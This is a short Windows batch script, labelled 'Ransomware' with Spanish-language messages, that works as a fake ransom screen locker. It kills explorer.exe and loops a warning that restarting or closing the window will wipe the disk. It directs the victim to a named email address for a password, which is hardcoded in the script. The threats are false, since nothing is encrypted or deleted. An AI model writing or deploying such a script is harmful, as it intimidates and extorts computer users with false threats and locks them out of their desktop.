//[Versión 2.0]
echo =============================================
color 2
@echo off 
title Ransomware
taskkill /f /im explorer.exe 
:bucle 
cls    
echo =============================================           
echo            LEE CON ATENCION!.
echo =============================================
echo  - No reiniciar la computadora!.
echo  - Al reiniciar se eliminara los datos del disco duro!.
echo  - Si usted cierra esta ventana no podra recuperar su computadora!.
echo  - ESCRIBIR A SlayerTitanZc@gmail.com PARA OBTENER EL PASSWORD!.
echo =============================================
echo  - Ingresar el password que recibio por correo.
echo =============================================
set /p pass= Escriba aqui el password: 
if %pass%==SlayerTitanZc (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo =============================================
echo Felicidades! El password es correcto.
echo =============================================
start explorer.exe
pause
exit